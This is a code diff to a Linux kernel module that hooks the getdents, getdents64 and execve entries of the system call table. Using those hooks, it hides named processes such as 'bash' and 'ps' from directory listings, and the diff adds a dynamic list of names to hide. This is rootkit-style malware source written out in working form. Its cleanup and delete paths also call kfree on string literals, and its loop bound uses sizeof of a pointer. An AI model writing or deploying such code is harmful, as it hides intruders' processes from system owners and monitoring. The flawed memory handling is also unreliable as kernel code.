@@ -17,6 +17,77 @@
 #include <linux/cred.h>
 #include <linux/fdtable.h>
 #include <linux/dcache.h>
+char** dynamic_processes_to_hide;
+int arrayListSize;
+int maxArrayListSize;
+//Add the process name to the arraylist
+//return 0 if successful; -ENOMEM if array failed to be expanded or allocated at startup;
+//NOTE THE STRING PASSED INTO THIS MUST BE A STRING COPIED TO THE KERNEL SPACE THROUGH KMALLOC THEN MEMCPY
+int addProcessToHide(char* processName){
+    if(arrayListSize == -1){
+        return -ENOMEM;
+    }
+    if(arrayListSize >= maxArrayListSize){
+        char** tempArray = kcalloc(2*maxArrayListSize,sizeof(char*),GFP_KERNEL);
+        if(!tempArray){
+            return -ENOMEM;
+        }
+        memcpy(tempArray,dynamic_processes_to_hide,arrayListSize*sizeof(char*));
+        kfree(dynamic_processes_to_hide);
+        dynamic_processes_to_hide = tempArray;
+        maxArrayListSize = maxArrayListSize*2;
+    }
+    int i;
+    for(i = 0;i < maxArrayListSize;i++){
+        if(dynamic_processes_to_hide[i] == NULL){
+            dynamic_processes_to_hide[i] = processName;
+            arrayListSize++;
+            break;
+        }
+    }
+    return 0;
+}
+
+//Remove the process name from the arraylist
+//return 0 if successful; successful if removed or item does not exist
+int deleteProcessToHide(char* processName){
+    if(arrayListSize == 0){
+        return 0;
+    }
+    int i;
+    for(i = 0;i < maxArrayListSize;i++){
+        if(dynamic_processes_to_hide[i] != NULL && strcmp(dynamic_processes_to_hide[i],processName)==0){
+            kfree(dynamic_processes_to_hide[i]);
+            arrayListSize--;
+            dynamic_processes_to_hide[i] = NULL;
+        }
+    }
+    return 0;
+}
+
+//return array list size so the user space program can determine the size of the buffer to send
+int getArrayListSize(void){
+    return arrayListSize;
+}
+
+//Fill in the provided buffer with the strings of hidden process names; count is the size of the buffer
+//Returns -ENOMEM if buffer does not exist or the buffer cannot fit all entries; 0 otherwise
+int getHiddenProcesses(char** buffer,int count){
+    if(!buffer || count < arrayListSize){
+        return -ENOMEM;
+    }
+    int i;
+    int current_count = 0;
+    for(i = 0;i < maxArrayListSize;i++){
+        if(dynamic_processes_to_hide[i] != NULL){
+            strcpy(buffer[current_count],dynamic_processes_to_hide[i]);
+            current_count++;
+        }
+    }
+    return 0;
+}
+
+
 unsigned long  **syscall_table;// = 0xffffffff81a00240;
 
 typedef struct linux_dirent{
@@ -35,7 +106,8 @@ typedef struct linux_dirent{
 }linux_dirent;
 
 
-char* processes_to_hide[] = {"bash","ps"};//array to hold preset processes to hide
+
+char* processes_to_hide[] = {"bash"};//array to hold preset processes to hide
 
 asmlinkage int (*original_getdents)(unsigned int,struct linux_dirent*, unsigned int);
 asmlinkage int (*original_getdents64)(unsigned int,struct linux_dirent*, unsigned int);//not sure which one of the two constants the kernel uses
@@ -82,8 +154,8 @@ asmlinkage int new_getdents(unsigned int fd,struct linux_dirent* dirp,
 
                     bool flag = false;
                     int i;
-                    for(i = 0; i < sizeof(processes_to_hide)/sizeof(char*); i++){//check if the process is one of the listed override processes
-                        if(strcmp(process_name,processes_to_hide[i]) == 0){
+                    for(i = 0; i < maxArrayListSize; i++){//check if the process is one of the listed override processes
+                        if(dynamic_processes_to_hide[i] != NULL && strcmp(process_name,dynamic_processes_to_hide[i]) == 0){
                             //printk("Match found for process to hide. Hiding from dirent entries.");
                             void* alteredBuffer = (((void*)(dirp)) + psbytes) + d->d_reclen;
                             int removedEntrySize = d->d_reclen;
@@ -171,6 +243,20 @@ int init_module(){
     syscall_table[__NR_getdents64] = (unsigned long*)new_getdents;//replace function
 	syscall_table[__NR_getdents] = (unsigned long*)new_getdents;
     syscall_table[__NR_execve] = (unsigned long*)new_execve;
+    dynamic_processes_to_hide = kcalloc(10,sizeof(char*),GFP_KERNEL);//create the array list;
+    if(!dynamic_processes_to_hide){
+        maxArrayListSize = -1;
+        arrayListSize = -1;
+    }
+    else{
+        maxArrayListSize = 10;
+        arrayListSize = 0;
+    }
+    char* string = "bash";
+    char* string2 = "ps";
+    addProcessToHide(string);
+    addProcessToHide(string2);
+    printk("%d",sizeof(dynamic_processes_to_hide));
     write_cr0 (read_cr0 () | 0x10000);//necessary to restore syscall table to read only
     return 0;
 }
@@ -181,7 +267,13 @@ void cleanup_module(){
 	syscall_table[__NR_getdents] = ((unsigned long*)original_getdents);
     syscall_table[__NR_execve] = ((unsigned long*)original_execve);
 	printk("successfully unloaded kernel module");
+    int i;
+    for(i = 0; i < sizeof(dynamic_processes_to_hide)/sizeof(char*);i++){
+        kfree(dynamic_processes_to_hide[i]);
+    }
+    kfree(dynamic_processes_to_hide);
     write_cr0 (read_cr0 () | 0x10000);
 }
 
 MODULE_LICENSE("GPL");
+
